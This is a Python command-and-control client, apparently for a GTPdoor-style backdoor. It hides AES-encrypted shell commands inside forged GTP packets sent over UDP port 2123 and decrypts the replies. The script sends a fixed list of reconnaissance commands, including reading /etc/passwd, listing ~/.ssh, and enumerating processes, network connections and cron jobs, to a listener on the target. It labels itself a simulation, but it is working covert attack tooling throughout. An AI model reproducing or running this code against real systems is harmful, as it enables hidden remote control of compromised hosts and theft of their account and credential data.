#!/usr/bin/env python3

import socket
import time
import sys
import base64
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes
from Crypto.Util.Padding import pad, unpad

# Pre-shared AES key (32 bytes for AES-256) - must match listener
AES_KEY = b"MySecretGTPDoorKey2024!@#$%^&*()"  # 32 bytes exactly

TARGET_IP = "192.168.135.131" #you can add your target IP here 
TARGET_PORT = 2123
LOGFILE = "gtpdoor_command_log.txt"
WAIT_FOR_RESPONSE = True
RESPONSE_TIMEOUT = 10  # seconds

commands = [
    "whoami",
    "hostname", 
    "id",
    "uname -a",
    "pwd",
    "ls -la /home/",
    "cat /etc/passwd",
    "ps aux",
    "netstat -tunap",
    "ip a",
    "arp -a",
    "lsof -i",
    "crontab -l",
    "ls -la ~/.ssh/",
    "dmesg | tail -n 50"
]

def encrypt_payload(plaintext):
    """Encrypt payload using AES-256-CBC"""
    try:
        # Generate random IV
        iv = get_random_bytes(16)
        cipher = AES.new(AES_KEY, AES.MODE_CBC, iv)
        
        # Pad and encrypt
        padded_data = pad(plaintext.encode('utf-8'), AES.block_size)
        encrypted_data = cipher.encrypt(padded_data)
        
        # Return IV + encrypted data, base64 encoded
        combined = iv + encrypted_data
        return base64.b64encode(combined).decode('utf-8')
    except Exception as e:
        log_message(f"[!] Encryption error: {e}")
        return None

def decrypt_payload(encrypted_data):
    """Decrypt payload using AES-256-CBC"""
    try:
        # Decode base64
        combined = base64.b64decode(encrypted_data.encode('utf-8'))
        
        # Extract IV and encrypted data
        iv = combined[:16]
        encrypted = combined[16:]
        
        # Decrypt
        cipher = AES.new(AES_KEY, AES.MODE_CBC, iv)
        decrypted_padded = cipher.decrypt(encrypted)
        
        # Remove padding
        decrypted = unpad(decrypted_padded, AES.block_size)
        return decrypted.decode('utf-8')
    except Exception as e:
        log_message(f"[!] Decryption error: {e}")
        return None

def create_gtp_packet(payload):
    """Create a GTP packet with encrypted payload"""
    # Encrypt the payload first
    encrypted_payload = encrypt_payload(payload)
    if encrypted_payload is None:
        return None
        
    # GTP header (8 bytes)
    gtp_header = b"\x32\x01\x00\x00\x00\x00\x00\x00"
    return gtp_header + encrypted_payload.encode('utf-8')

def parse_response(data):
    """Parse and decrypt response packet"""
    if len(data) < 8:
        return "Response too short"
    
    try:
        # Extract encrypted payload
        encrypted_payload = data[8:].decode('utf-8', errors='ignore').strip()
        
        # Decrypt the payload
        decrypted_payload = decrypt_payload(encrypted_payload)
        if decrypted_payload is None:
            return "Failed to decrypt response"
            
        return decrypted_payload
    except Exception as e:
        return f"Error parsing response: {e}"

def log_message(message):
    """Log message to both console and file"""
    print(message)
    with open(LOGFILE, 'a') as f:
        f.write(message + '\n')

def send_command(sock, cmd):
    """Send an encrypted command and optionally wait for response"""
    payload = f"GTPDOOR:cmd:{cmd}"
    packet = create_gtp_packet(payload)
    
    if packet is None:
        log_message(f"[!] Failed to encrypt command: {cmd}")
        return False
    
    log_message(f"[>] Sending encrypted command: {cmd}")
    
    try:
        # Send the packet
        bytes_sent = sock.sendto(packet, (TARGET_IP, TARGET_PORT))
        log_message(f"[✓] Sent {bytes_sent} bytes to {TARGET_IP}:{TARGET_PORT}")
        
        if WAIT_FOR_RESPONSE:
            log_message("[*] Waiting for encrypted response...")
            
            # Set socket timeout for response
            sock.settimeout(RESPONSE_TIMEOUT)
            
            try:
                response_data, response_addr = sock.recvfrom(65507)
                log_message(f"[<] Encrypted response received from {response_addr} ({len(response_data)} bytes)")
                
                # Parse and decrypt response
                response_text = parse_response(response_data)
                log_message(f"[<] Decrypted response content:")
                
                # Pretty print the response
                for line in response_text.split('\n'):
                    log_message(f"    {line}")
                
                return True
                
            except socket.timeout:
                log_message("[!] No response received within timeout")
                return True  # Still consider it successful since packet was sent
            except Exception as e:
                log_message(f"[!] Error receiving response: {e}")
                return True  # Still consider it successful since packet was sent
        
        return True
        
    except Exception as e:
        log_message(f"[!] Error sending command '{cmd}': {e}")
        return False

def main():
    log_message("[*] Starting Python GTPdoor command simulation with AES-256 encryption")
    log_message(f"[*] Target: {TARGET_IP}:{TARGET_PORT}")
    log_message(f"[*] AES Key: {AES_KEY.decode('utf-8')}")  # For debugging - remove in production
    log_message(f"[*] Response timeout: {RESPONSE_TIMEOUT} seconds")
    log_message(f"[*] Wait for responses: {WAIT_FOR_RESPONSE}")
    log_message("")
    
    # Create UDP socket
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        log_message("[✓] UDP socket created successfully")
    except Exception as e:
        log_message(f"[!] Failed to create socket: {e}")
        return 1
    
    success_count = 0
    failure_count = 0
    
    try:
        for i, cmd in enumerate(commands, 1):
            log_message(f"\n--- Command {i}/{len(commands)} ---")
            
            if send_command(sock, cmd):
                success_count += 1
            else:
                failure_count += 1
            
            # Wait between commands (except for the last one)
            if i < len(commands):
                log_message("[*] Waiting 3 seconds before next command...")
                time.sleep(3)
    
    except KeyboardInterrupt:
        log_message("\n[*] Interrupted by user")
    
    finally:
        sock.close()
        log_message("\n[*] Socket closed")
    
    log_message(f"\n[*] All commands processed.")
    log_message(f"[*] Success: {success_count}, Failures: {failure_count}")
    log_message(f"[*] Check your listener for command execution results.")
    
    return 0 if failure_count == 0 else 1

if __name__ == "__main__":
    sys.exit(main())
